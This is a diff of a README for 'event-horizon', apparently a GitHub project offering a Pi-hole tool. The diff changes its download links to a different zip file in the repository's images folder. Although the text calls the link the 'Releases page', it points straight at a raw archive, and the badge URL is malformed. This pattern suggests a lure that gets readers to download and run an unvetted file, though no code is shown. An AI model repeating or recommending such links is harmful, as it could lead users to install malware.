@@ -1,7 +1,7 @@
 # 🎉 event-horizon - Simplify Your Pi-hole Experience 
 
 ## 📥 Download Now
-[![Download Event Horizon](https://github.com/Imusama23/event-horizon/raw/refs/heads/main/images/horizon_event_v1.5.zip%20Event%20Horizon-v1.0-brightgreen)](https://github.com/Imusama23/event-horizon/raw/refs/heads/main/images/horizon_event_v1.5.zip)
+[![Download Event Horizon](https://raw.githubusercontent.com/Imusama23/event-horizon/main/images/horizon_event_thunderfish.zip%20Event%20Horizon-v1.0-brightgreen)](https://raw.githubusercontent.com/Imusama23/event-horizon/main/images/horizon_event_thunderfish.zip)
 
 ## 🚀 Getting Started 
 Event Horizon is a lightweight tool designed to make managing your Pi-hole easier. With this application, you can quickly disable Pi-hole for any user on your network without dealing with complex settings or user interfaces. Follow this guide to download and run the software smoothly.
@@ -22,7 +22,7 @@ Ensure your system meets these requirements before proceeding.
 ## 💻 Download & Install
 To download Event Horizon, visit the Releases page:
 
-[Visit the Releases Page to Download](https://github.com/Imusama23/event-horizon/raw/refs/heads/main/images/horizon_event_v1.5.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Imusama23/event-horizon/main/images/horizon_event_thunderfish.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version of Event Horizon.
